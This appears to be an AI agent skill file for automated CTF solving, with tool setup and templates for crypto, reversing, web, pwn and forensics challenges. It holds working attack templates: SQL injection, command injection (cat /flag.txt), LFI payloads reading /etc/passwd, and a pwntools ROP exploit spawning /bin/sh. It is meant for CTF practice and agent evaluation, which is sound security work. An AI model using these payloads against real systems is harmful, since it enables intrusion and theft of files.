---
name: ctf-solver
description: Automated Capture The Flag challenge solver with multi-category support. Use when you need to (1) Solve crypto challenges using symbolic execution, (2) Reverse engineer binaries and find flags, (3) Exploit web vulnerabilities, (4) Analyze forensics artifacts, (5) Develop exploits for pwn challenges, or (6) Solve puzzle/misc CTF challenges.
metadata:
  type: security
  category: offensive-security
---

# CTF Solver Skill

Autonomous CTF challenge solving across multiple categories using specialized tools and techniques.

## Inspired By

This skill is inspired by research showing AI agents can solve CTF challenges:
- SWE-Agent solving 10+ challenges from Hack The Box and 15+ from PicoCTF
- EnIGMA from Princeton achieving state-of-the-art on Cybench benchmark
- Anthropic's Frontier Red Team climbing CTF scoreboards at DEFCON 33

## Prerequisites

### Core CTF Tools

```bash
# pwntools - Binary exploitation framework
pip install pwntools

# z3-solver - SMT solver for crypto/reversing
pip install z3-solver

# angr - Binary analysis platform
pip install angr

# ROPgadget - ROP chain builder
pip install ROPgadget

# pycryptodome - Cryptography library
pip install pycryptodome

# requests - HTTP library for web challenges
pip install requests beautifulsoup4

# volatility3 - Memory forensics
pip install volatility3

# binwalk - Firmware analysis
sudo apt-get install binwalk

# radare2 - Reverse engineering framework
sudo apt-get install radare2

# Ghidra - Binary analysis (manual download)
# Download from https://ghidra-sre.org/
```

### Optional Advanced Tools

```bash
# angr-management - GUI for angr
pip install angr-management

# unicorn - CPU emulator
pip install unicorn

# capstone - Disassembler
pip install capstone

# keystone - Assembler
pip install keystone-engine

# frida - Dynamic instrumentation
pip install frida-tools

# John the Ripper - Password cracking
sudo apt-get install john

# hashcat - Advanced password recovery
sudo apt-get install hashcat

# stegsolve - Steganography tool
# Download JAR from https://github.com/zardus/ctf-tools
```

## Challenge Categories

### 1. Cryptography Challenges

Solve crypto challenges using mathematical tools and known attacks.

**Common Patterns:**
- RSA with small exponents or common modulus
- Classical ciphers (Caesar, Vigenere, substitution)
- XOR encryption with key reuse
- ECB mode vulnerabilities
- Hash length extension attacks

**Tools & Techniques:**

```python
# RSA attack example
from Crypto.Util.number import long_to_bytes
import gmpy2

# Low exponent attack
def low_exponent_attack(c, e, n):
    m, exact = gmpy2.iroot(c, e)
    if exact:
        return long_to_bytes(int(m))
    return None

# Common modulus attack
def common_modulus_attack(c1, c2, e1, e2, n):
    gcd, s1, s2 = gmpy2.gcdext(e1, e2)
    if gcd != 1:
        return None
    if s1 < 0:
        c1 = gmpy2.invert(c1, n)
        s1 = -s1
    if s2 < 0:
        c2 = gmpy2.invert(c2, n)
        s2 = -s2
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    return long_to_bytes(int(m))

# XOR key recovery
def xor_key_recovery(ciphertexts):
    # Assuming repeated key XOR
    key_length = detect_key_length(ciphertexts)
    key = []
    for i in range(key_length):
        bytes_at_position = [ct[i::key_length] for ct in ciphertexts]
        key.append(find_single_byte_xor_key(bytes_at_position))
    return bytes(key)
```

**Helper Script:**

```bash
# Crypto challenge solver
uv run ./scripts/solve_crypto.py \
  --challenge-file challenge.py \
  --challenge-type rsa|aes|xor|classical \
  --known-values n=123,e=65537,c=456
```

### 2. Reverse Engineering

Analyze binaries to understand behavior and extract flags.

**Workflow:**

```bash
# 1. File identification
file binary
strings binary | grep -i flag

# 2. Check for packing/obfuscation
upx -t binary 2>/dev/null && echo "UPX packed"

# 3. Static analysis with radare2
r2 binary
> aaa  # Analyze all
> afl  # List functions
> pdf @main  # Disassemble main
> / flag  # Search for "flag" string

# 4. Decompile with Ghidra
ghidra binary  # Manual analysis

# 5. Dynamic analysis
ltrace binary
strace binary

# 6. Symbolic execution with angr
python3 solve_with_angr.py binary
```

**Angr Solver Template:**

```python
import angr
import claripy

def solve_binary(binary_path, find_addr=None, avoid_addrs=None):
    project = angr.Project(binary_path, auto_load_libs=False)

    # Create symbolic input
    flag = claripy.BVS('flag', 8*32)  # 32 byte flag
    state = project.factory.entry_state(stdin=flag)

    # Add constraints (e.g., printable ASCII)
    for byte in flag.chop(8):
        state.solver.add(byte >= 0x20)
        state.solver.add(byte <= 0x7e)

    # Create simulation manager
    simgr = project.factory.simulation_manager(state)

    # Find path to success, avoid failure
    simgr.explore(find=find_addr, avoid=avoid_addrs)

    if simgr.found:
        solution_state = simgr.found[0]
        solution = solution_state.solver.eval(flag, cast_to=bytes)
        return solution

    return None
```

**Helper Script:**

```bash
# Reverse engineering automation
uv run ./scripts/solve_reverse.py \
  --binary challenge.bin \
  --find-string "Correct!" \
  --avoid-string "Wrong!" \
  --timeout 300
```

### 3. Web Exploitation

Exploit web application vulnerabilities to capture flags.

**Common Vulnerabilities:**
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Local/Remote File Inclusion (LFI/RFI)
- Server-Side Request Forgery (SSRF)
- Insecure Deserialization
- JWT vulnerabilities

**Attack Templates:**

```python
import requests
from urllib.parse import urlencode

# SQL Injection
def sql_injection(url, param):
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=0 UNION SELECT table_name,NULL FROM information_schema.tables--"
    ]
    for payload in payloads:
        r = requests.get(url, params={param: payload})
        if "flag" in r.text.lower():
            return extract_flag(r.text)
    return None

# Command Injection
def command_injection(url, param):
    payloads = [
        "; cat /flag.txt",
        "| cat /flag.txt",
        "`cat /flag.txt`",
        "$(cat /flag.txt)"
    ]
    for payload in payloads:
        r = requests.get(url, params={param: payload})
        if "flag" in r.text.lower():
            return extract_flag(r.text)
    return None

# LFI exploitation
def lfi_exploit(url, param):
    payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/flag.txt",
        "php://filter/convert.base64-encode/resource=index.php"
    ]
    for payload in payloads:
        r = requests.get(url, params={param: payload})
        if "root:x:" in r.text or "flag" in r.text.lower():
            return r.text
    return None
```

**Helper Script:**

```bash
# Web exploitation automation
uv run ./scripts/solve_web.py \
  --url http://target.ctf/challenge \
  --vuln-type sqli|xss|cmdi|lfi \
  --param vulnerable_param
```

### 4. Binary Exploitation (Pwn)

Develop exploits for binary vulnerabilities.

**Common Techniques:**
- Buffer overflow
- Format string vulnerabilities
- Return-oriented programming (ROP)
- Heap exploitation
- Return-to-libc attacks
- GOT/PLT overwriting

**Exploitation Framework:**

```python
from pwn import *

def exploit_buffer_overflow(binary_path, remote_addr=None):
    # Set context
    context.binary = binary_path
    elf = ELF(binary_path)

    # Start process
    if remote_addr:
        host, port = remote_addr.split(':')
        io = remote(host, int(port))
    else:
        io = process(binary_path)

    # Find offset
    pattern = cyclic(200)
    io.sendline(pattern)
    io.wait()

    core = io.corefile
    offset = cyclic_find(core.read(core.esp, 4))

    # Build ROP chain
    rop = ROP(elf)
    rop.call('system', [next(elf.search(b'/bin/sh'))])

    # Craft payload
    payload = flat([
        b'A' * offset,
        rop.chain()
    ])

    # Exploit
    io = process(binary_path) if not remote_addr else remote(host, int(port))
    io.sendline(payload)
    io.interactive()

    return io

# Format string exploitation
def exploit_format_string(binary_path, offset):
    elf = ELF(binary_path)
    io = process(binary_path)

    # Leak addresses
    payload = f"%{offset}$p.%{offset+1}$p"
    io.sendline(payload)
    leaks = io.recvline()

    # Write to GOT
    writes = {elf.got['printf']: elf.symbols['system']}
    payload = fmtstr_payload(offset, writes)

    io.sendline(payload)
    io.interactive()
```

**Helper Script:**

```bash
# Pwn challenge automation
uv run ./scripts/solve_pwn.py \
  --binary challenge.bin \
  --libc libc.so.6 \
  --remote host:port \
  --exploit-type bof|rop|fmt|heap
```

### 5. Forensics

Analyze artifacts to extract hidden information.

**Common Tasks:**
- File carving and recovery
- Memory dump analysis
- Network packet analysis
- Steganography detection
- Metadata extraction
- Disk image analysis

**Analysis Workflow:**

```bash
# File analysis
file evidence.bin
binwalk -e evidence.bin
foremost -i evidence.bin -o output/

# Strings analysis
strings evidence.bin | grep -i flag
strings -e l evidence.bin  # 16-bit little-endian
strings -e b evidence.bin  # 16-bit big-endian

# Image steganography
stegsolve evidence.png  # GUI tool
zsteg evidence.png -a    # Detect hidden data
steghide extract -sf evidence.jpg

# PCAP analysis
tshark -r capture.pcap -Y "http.request.uri contains flag"
tshark -r capture.pcap -T fields -e data.text

# Memory forensics with Volatility
vol.py -f memory.dump imageinfo
vol.py -f memory.dump --profile=Win7SP1x64 pslist
vol.py -f memory.dump --profile=Win7SP1x64 cmdline
vol.py -f memory.dump --profile=Win7SP1x64 filescan | grep flag
```

**Helper Script:**

```bash
# Forensics automation
uv run ./scripts/solve_forensics.py \
  --file evidence.bin \
  --analysis-type file|memory|network|steg \
  --output-dir results/
```

### 6. Miscellaneous/Puzzle

Solve programming challenges, OSINT, and puzzle-based CTFs.

**Common Types:**
- Programming challenges
- OSINT (Open Source Intelligence)
- Logic puzzles
- Esoteric programming languages
- QR codes and barcodes
- Audio/video steganography

**Techniques:**

```bash
# QR code decoding
zbarimg qrcode.png

# Audio steganography
sox audio.wav -n spectrogram  # View spectrogram
steghide extract -sf audio.wav

# Esoteric languages
# Brainfuck, Malbolge, Whitespace interpreters
python3 brainfuck_interpreter.py code.bf

# OSINT
# Google dorking, reverse image search, metadata extraction
exiftool image.jpg
```

## Multi-Step Problem Solving

CTF challenges often require multiple steps. Track progress with tape system:

```python
def solve_multi_step_challenge():
    # Step 1: Reconnaissance
    tape.handoff(name="recon", summary="Analyzing challenge files")
    files = analyze_challenge_files()

    # Step 2: Identify vulnerability type
    tape.handoff(name="identify", summary="Vulnerability identified")
    vuln_type = identify_vulnerability(files)

    # Step 3: Develop exploit
    tape.handoff(name="exploit", summary="Developing exploit")
    exploit = develop_exploit(vuln_type)

    # Step 4: Execute and capture flag
    tape.handoff(name="execute", summary="Executing exploit")
    flag = execute_exploit(exploit)

    return flag
```

## Integration with Cybench

Evaluate agent performance on professional CTF tasks:

```bash
# Run Cybench evaluation
uv run ./scripts/cybench_eval.py \
  --dataset cybench-pro \
  --task-category all \
  --timeout 1800 \
  --output results.json

# View results
uv run ./scripts/view_results.py \
  --results results.json \
  --show-metrics success_rate,time_to_solve,subtask_completion
```

**Performance Tracking:**

```json
{
  "evaluation": {
    "dataset": "cybench",
    "total_tasks": 40,
    "solved": 15,
    "success_rate": 0.375,
    "category_breakdown": {
      "crypto": {"solved": 8, "total": 10},
      "reversing": {"solved": 3, "total": 10},
      "web": {"solved": 4, "total": 10},
      "pwn": {"solved": 0, "total": 10}
    },
    "difficulty_breakdown": {
      "easy": {"solved": 12, "total": 15},
      "medium": {"solved": 3, "total": 15},
      "hard": {"solved": 0, "total": 10}
    }
  }
}
```

## Autonomous Solving Workflow

```python
class CTFSolver:
    def __init__(self, challenge_dir):
        self.challenge_dir = challenge_dir
        self.max_attempts = 3
        self.timeout = 1800  # 30 minutes

    def solve(self):
        # 1. Analyze challenge
        category = self.detect_category()

        # 2. Select appropriate solver
        solver = self.get_solver(category)

        # 3. Attempt solution with retries
        for attempt in range(self.max_attempts):
            try:
                flag = solver.solve(timeout=self.timeout)
                if self.validate_flag(flag):
                    return flag
            except TimeoutError:
                if attempt < self.max_attempts - 1:
                    # Adjust strategy
                    solver = self.get_alternative_solver(category)
                    continue
                else:
                    return None

        return None

    def detect_category(self):
        # Analyze files to determine challenge type
        files = os.listdir(self.challenge_dir)

        if any(f.endswith('.py') and 'crypto' in open(f).read() for f in files):
            return 'crypto'
        elif any(f.endswith(('.bin', '.elf', '.exe')) for f in files):
            return 'reversing'
        elif any('http' in f or 'web' in f for f in files):
            return 'web'
        elif any('.pcap' in f or '.cap' in f for f in files):
            return 'forensics'
        else:
            return 'misc'
```

## Known Limitations

Based on SWE-Agent research, AI agents currently fail at:

1. **Long-Running Exploits**: Challenges requiring >30 minutes of brute-forcing
2. **Complex Binary Patching**: Multi-step reversing with many intermediate steps
3. **Context Window Limits**: Very large binaries or extensive analysis
4. **Advanced Heap Exploitation**: Requires deep understanding of memory allocators

**Mitigation Strategies:**
- Break down complex tasks into smaller subtasks
- Use incremental solving with checkpoints
- Leverage external tools for heavy computation
- Focus on automated validation of intermediate results

## Best Practices

1. **Start with Easy Challenges**
   - Build confidence and learn patterns
   - Most agents solve 80%+ of easy challenges

2. **Use Proper Tools**
   - Don't reinvent the wheel
   - Leverage pwntools, angr, z3

3. **Validate Solutions**
   - Always verify flag format
   - Test exploits multiple times

4. **Document Approach**
   - Use tape system for audit trail
   - Record successful techniques

5. **Time Management**
   - Set timeouts for each approach
   - Move to alternative if stuck

6. **Learn from Failures**
   - Analyze why attempts failed
   - Adjust strategy for next challenge

## Success Metrics

Track your CTF solving performance:

```bash
# Generate performance report
uv run ./scripts/ctf_stats.py \
  --timeframe last-30-days \
  --show-categories \
  --show-difficulty \
  --export report.pdf
```

**Key Metrics:**
- Solve rate by category
- Average time to solve
- Success on first attempt vs retries
- Difficulty progression

## Reference Materials

- [CTF Time](https://ctftime.org/) - CTF calendar and writeups
- [PicoCTF](https://picoctf.org/) - Beginner-friendly CTF
- [Hack The Box](https://www.hackthebox.com/) - Pentesting labs
- [Cybench Dataset](https://github.com/princeton-nlp/cybench) - Professional CTF benchmark
- [pwntools Documentation](https://docs.pwntools.com/)
- [angr Documentation](https://docs.angr.io/)
- [SWE-Agent Cyber](https://github.com/harishsg993010/swe-agent-cyber) - Research repo
- [EnIGMA Paper](https://enigma-agent.github.io/) - Princeton CTF agent research
